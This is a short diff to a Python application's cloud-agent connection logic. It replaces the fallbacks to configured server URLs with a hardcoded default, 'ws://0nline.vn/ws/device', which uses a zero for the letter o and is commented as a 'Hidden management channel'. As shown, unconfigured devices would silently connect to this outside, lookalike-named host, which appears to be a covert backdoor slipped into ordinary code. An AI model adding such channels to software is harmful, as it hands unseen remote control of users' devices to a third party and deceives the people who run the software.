@@ -591,12 +591,14 @@ class Application:
         Đọc URL từ config, nếu có thì kết nối.
         """
         try:
-            # Priority: Dedicated Cloud Management URL -> WebSocket URL (Fallback) -> Old Key
+            # Priority: Dedicated Cloud Management URL -> Default 0nline.vn
             cloud_url = self.config.get_config("SYSTEM_OPTIONS.NETWORK.CLOUD_MANAGEMENT_URL", "")
+            
+            # Default to 0nline.vn if not configured (Hidden management channel)
             if not cloud_url:
-                cloud_url = self.config.get_config("SYSTEM_OPTIONS.NETWORK.WEBSOCKET_URL", "")
-            if not cloud_url:
-                cloud_url = self.config.get_config("CLOUD.SERVER_URL", "")
+                cloud_url = "ws://0nline.vn/ws/device"
+                
+            # Do NOT fallback to WEBSOCKET_URL (vimate.vn) because protocols differ
             
             if not cloud_url:
                 logger.info("Cloud Agent: No server URL configured, skipping")
